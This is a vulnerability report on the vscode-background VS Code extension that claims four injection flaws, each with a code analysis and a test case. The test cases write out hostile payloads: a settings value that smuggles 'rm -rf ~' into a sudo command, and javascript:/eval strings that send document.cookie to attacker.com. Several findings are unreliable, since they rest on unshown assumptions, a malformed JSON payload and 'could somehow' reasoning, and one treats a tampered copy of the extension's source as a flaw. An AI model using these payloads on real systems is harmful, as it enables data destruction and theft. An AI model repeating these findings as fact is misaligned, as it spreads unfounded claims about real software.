# Vulnerabilities in vscode-background

## 1. Command Injection via Malicious Image URLs

**Description**: The VSCode Background extension allows users to specify URLs for background images. However, there's a critical vulnerability in how these URLs are handled when executing privileged commands. When a user has insufficient permissions to write to VSCode files, the extension uses sudo to execute a move command, but fails to properly validate or sanitize the image URLs, which are directly concatenated into the command string. A malicious actor could craft a repository with a settings.json file that includes a specially crafted URL containing shell command injection characters.

**Impact**: This vulnerability allows arbitrary command execution with elevated privileges on the victim's system. An attacker could execute commands as root/administrator, potentially leading to complete system compromise, data theft, or installation of persistent malware.

**Vulnerability Rank**: Critical

**Currently Implemented Mitigations**: The extension attempts to quote file paths in the move command, but does not properly validate or sanitize user-provided image URLs.

**Missing Mitigations**: 
- Validate that image URLs contain only safe characters
- Use a whitelist approach to only allow specific protocols (https://, file://)
- Implement proper sanitization of URLs before using them in command execution
- Use safer APIs for file operations instead of shell commands

**Preconditions**: 
- Victim must have the vscode-background extension installed
- Victim must open a repository with a maliciously crafted .vscode/settings.json file
- The victim must have insufficient permissions to write to VSCode files, triggering the sudo execution path

**Source Code Analysis**: 
The vulnerability exists in the `AbsPatchFile.base.ts` file where file operations are performed. When a user doesn't have write permissions, the extension attempts to use sudo:

```typescript
// AbsPatchFile.base.ts
const mvcmd = process.platform === 'win32' ? 'move /Y' : 'mv -f';
const cmdarg = `${mvcmd} "${tempFilePath}" "${filePath}"`;
await _.sudoExec(cmdarg, { name: 'Background Extension' });
```

The key issue is that `tempFilePath` can be influenced by user-provided image URLs. When a malicious URL is provided in settings.json, the extension saves this content to a temp file, which is then moved using sudo. If the URL contains shell metacharacters, they can break out of the quoted string and inject arbitrary commands.

This is particularly dangerous because:
1. The command is executed with elevated privileges via sudo
2. There's no validation of URL protocols or contents
3. The command is constructed via string concatenation

**Security Test Case**:
1. Create a malicious repository with a `.vscode/settings.json` file containing:
```json
{
  "background.fullscreen": {
    "images": ["file:///tmp/"; rm -rf ~ #"]
  }
}
```

2. Push this repository to a public Git hosting service
3. Convince a victim who has the vscode-background extension installed to open this repository
4. When the victim opens the repository and doesn't have sufficient permissions to modify VSCode files:
   - The extension will attempt to use sudo to move files
   - The malicious command will be executed with elevated privileges
   - The victim's home directory will be deleted

## 2. Remote Code Execution via javascript: Protocol URLs

**Description**: The extension allows users to specify URLs for background images but doesn't validate that these URLs use safe protocols. The URLs are injected into VSCode's core JavaScript files and used in CSS background-image properties. A malicious actor could craft a repository with a settings.json file that includes a javascript: URL as a background image, which could be executed in the context of VSCode's Electron environment.

**Impact**: This could lead to remote code execution within the context of the VSCode application, allowing an attacker to steal sensitive information, access local files, or execute arbitrary commands on the victim's system.

**Vulnerability Rank**: High

**Currently Implemented Mitigations**: The extension normalizes file:// URLs to vscode-file:// protocol, but it doesn't validate that non-file URLs are using safe protocols.

**Missing Mitigations**: The extension should validate that image URLs use only safe protocols (like https://, http://, file://, vscode-file://) and reject URLs using potentially dangerous protocols (like javascript:, data:, etc.).

**Preconditions**: 
- Victim must have the vscode-background extension installed
- Victim must open a repository with a maliciously crafted settings.json file

**Source Code Analysis**: 
In `PatchGenerator.base.ts`, the `normalizeImageUrls` method only checks if URLs start with "file://" but doesn't validate other protocols:

```typescript
protected normalizeImageUrls(images: string[]) {
    return images.map(imageUrl => {
        if (!imageUrl.startsWith('file://')) {
            return imageUrl;
        }

        // file:///Users/foo/bar.png => vscode-file://vscode-app/Users/foo/bar.png
        const url = imageUrl.replace('file://', 'vscode-file://vscode-app');
        return vscode.Uri.parse(url).toString();
    });
}
```

These unvalidated URLs are then embedded in JavaScript and CSS for background images:

```typescript
// In FullscreenPatchGenerator.ts
function setNextImg() {
    document.body.style.setProperty(cssvariable, 'url(' + getNextImg() + ')');
}
```

Since VSCode runs in an Electron environment, which is based on Chromium, javascript: URLs in certain contexts could be executed, especially since the extension modifies VSCode's core JavaScript files.

**Security Test Case**:
1. Create a malicious repository with a `.vscode/settings.json` file that includes a JavaScript URL as a background image:
```json
{
  "background.editor": {
    "images": ["javascript:fetch('https://attacker.com/steal?data='+document.cookie)"]
  }
}
```

2. Push this repository to a public Git hosting service
3. Convince a victim who has the vscode-background extension installed to open this repository
4. When the victim opens the repository, the extension would embed the javascript: URL in VSCode's core JavaScript files
5. If the URL is executed in VSCode's Electron environment, it would send the victim's cookie data to the attacker's server

## 3. Code Injection via Malformed Image URLs

**Description**: The extension allows users to specify custom image URLs which are injected directly into VSCode's JavaScript files. While the URLs are JSON-stringified when embedded in arrays, they're later concatenated directly into JavaScript strings without additional validation. A malicious actor could craft a repository with a settings.json file containing specially crafted URLs that, when processed by the extension, could lead to code injection.

**Impact**: This vulnerability allows remote code execution within the context of the VSCode application, enabling an attacker to access sensitive information, modify files, or execute arbitrary commands.

**Vulnerability Rank**: High

**Currently Implemented Mitigations**: The extension uses JSON.stringify for arrays of URLs, which provides some protection against basic string breaking attacks.

**Missing Mitigations**: 
- Implement strict validation of image URLs, allowing only safe protocols and characters
- Use proper encoding/escaping when embedding user-provided values in JavaScript
- Consider using safer alternatives to direct string concatenation for dynamic values

**Preconditions**: 
- Victim must have the vscode-background extension installed
- Victim must open a repository with a maliciously crafted settings.json file

**Source Code Analysis**: 
In various PatchGenerator classes, user-provided URLs are embedded in generated JavaScript. For example, in FullscreenPatchGenerator.ts:

```typescript
protected getScript(): string {
    const { images, random, interval } = this.curConfig;
    return `
const cssvariable = '${this.cssvariable}';
const images = ${JSON.stringify(images)};
const random = ${random};
const interval = ${interval};

// ... more code ...

function setNextImg() {
    document.body.style.setProperty(cssvariable, 'url(' + getNextImg() + ')');
}

// ... more code ...
    `;
}
```

While the URLs in the images array are JSON-stringified, they're later used in direct string concatenation in setNextImg(). If a URL could somehow break out of the string context or manipulate the JavaScript execution flow, it could lead to code injection.

**Security Test Case**:
1. Create a malicious repository with a `.vscode/settings.json` file containing carefully crafted URLs designed to break out of string contexts:
```json
{
  "background.fullscreen": {
    "images": ["\\"); eval(\"fetch('https://attacker.com/steal?data='+document.cookie)\"); (\""]
  }
}
```

2. Push this repository to a public Git hosting service
3. Convince a victim who has the vscode-background extension installed to open this repository
4. When the victim opens the repository, the extension would inject the malicious code into VSCode's JavaScript files
5. If the injection succeeds, the code would execute and send sensitive data to the attacker's server

## 4. Arbitrary Code Injection via Malicious Patch Generation

**Description**: The extension "patches" VSCode's core JavaScript file by dynamically generating a block of JavaScript code (a "patch") that is appended to the VSCode runtime file. The patch is generated by modules in the PatchGenerator family (for example, in the Editor, Sidebar, Panel, and Fullscreen patch generators) without performing any cryptographic integrity checks, strict validation, or sanitization of the generated content.  
A threat actor who provides a manipulated (malicious) repository could alter the patch generation code or its configuration defaults so that the produced patch includes arbitrary JavaScript payloads. When the extension calls its "applyPatch" routine (via the Background.setup method), the malicious patch is appended onto VSCode's main JavaScript file (using the markers "// vscode-background‐start …" and "// vscode-background‐end"). Because VSCode executes this patched JS file on startup, the injected payload would execute in the context of VSCode—potentially giving the attacker remote code execution (RCE) capabilities.

**Impact**: 
- **Remote Code Execution (RCE):** The injected JavaScript payload runs with the privileges of the VSCode process. An attacker could execute arbitrary commands or modify the runtime behavior of VSCode and, in worst‑case scenarios, escalate privileges.  
- **Persistence:** Since the patch is written into a core file that is reloaded on every restart, the malicious payload can persist until the patch is removed.  
- **Compromise of Developer Environment:** As many developers rely on VSCode for daily coding work (and might even run it with elevated privileges in some cases), this vulnerability directly leads to a compromise of the development environment.

**Vulnerability Rank**: Critical

**Currently Implemented Mitigations**: 
- The extension uses a **file-locking mechanism** (via the "lockfile" package and custom lock/unlock functions in the utility namespace) during the patch application process so that concurrent accesses are controlled.  
- It inspects the current patch state of the target file (by checking for markers like the version string, e.g. `${BACKGROUND_VER}.${VERSION}`) so that patches are not applied repeatedly if already "patched."  
- However, these mechanisms are aimed at preventing inconsistent writes rather than sanitizing or verifying the integrity of the patch content.

**Missing Mitigations**: 
- **Integrity Verification:** There is no digital signature or hash verification of the patch script before appending it to the VSCode source file.  
- **Sanitization/Validation of Generated Code:** The generated patch code is formed by string concatenation and JSON serialization of configuration values without checking that no malicious payload is inserted.  
- **Authorization of Repository Content:** There is no mechanism to verify that the extension's source code (including the patch-generation modules) has not been tampered with before installation.

**Preconditions**: 
- The victim must install the manipulated (malicious) extension repository.  
- The extension's feature is enabled (typically via `"background.enabled": true` in the user settings).  
- The attacker must successfully inject altered logic into one or more of the patch generator modules (for example, by providing malicious defaults or code changes in the repository that will be compiled into the final patch).  
- The environment must allow the extension to write to VSCode's core files (which is normally the case if VSCode is installed in a location with write permission or if elevated privileges are used).

**Source Code Analysis**: 
- In **`src/extension.ts`**, the activation routine instantiates a `Background` object and then calls its asynchronous `setup()` method.  
- The `setup()` method (in **`src/background/Background.ts`**) calls `applyPatch()` if the extension is enabled and if the target JS file is not already patched with the latest version.  
- The `applyPatch()` method gathers configuration options (including settings for images, styles, intervals, etc.) and passes them to `PatchGenerator.create()`.  
- In **`src/background/PatchGenerator/index.ts`**, several specialized patch generators (for editor, sidebar, panel, and fullscreen) are invoked. Their output is concatenated and then passed through uglify-js before being returned as a single script.  
- Finally, in **`src/background/PatchFile/PatchFile.javascript.ts`**, the method `applyPatches()` reads the current VSCode JS file (located via `vscodePath.jsPath`), "cleans" previous patches by removing anything between the markers, and then appends the new patch.  
- Because no validation is applied to the generated script from `PatchGenerator.create()`, if any of the patch generating modules is altered (for example, to include a malicious payload), that payload will be concatenated into the final script and executed on VSCode restart.

**Security Test Case**:
1. **Setup a Test Environment:**  
   - Install VSCode (or code‑server) on a test machine where changes to the VSCode installation file are permitted.  
   - Create a test instance where the extension is installed from a controlled (malicious) repository version.
2. **Manipulate the Repository:**  
   - Alter the patch generator module (for example, in **`src/background/PatchGenerator/PatchGenerator.editor.ts`**) so that the generated patch code includes an unmistakable payload (e.g., a command such as `console.error("RCE triggered")` or an invocation of `require('child_process').exec('calc')` on Windows).  
   - Build the extension with these modifications.
3. **Simulate User Actions:**  
   - Set `"background.enabled": true` in the user settings and reload VSCode so that the extension's activation routine is run.  
   - Verify that the extension's setup routine detects that patching is necessary and calls `applyPatch()`.
4. **Observe the Effects:**  
   - Open the patched VSCode JavaScript file (e.g. the file at `vscodePath.jsPath`) and check that the malicious payload appears between the markers `// vscode-background-start` and `// vscode-background-end`.  
   - Restart VSCode and verify (via debug console logs or by observing the payload's effect) that the injected malicious code executes.
5. **Report the Findings:**  
   - Confirm that the attacker-controlled payload runs with the privileges of the VSCode process, proving that the extension permits arbitrary code injection without adequate mitigation.
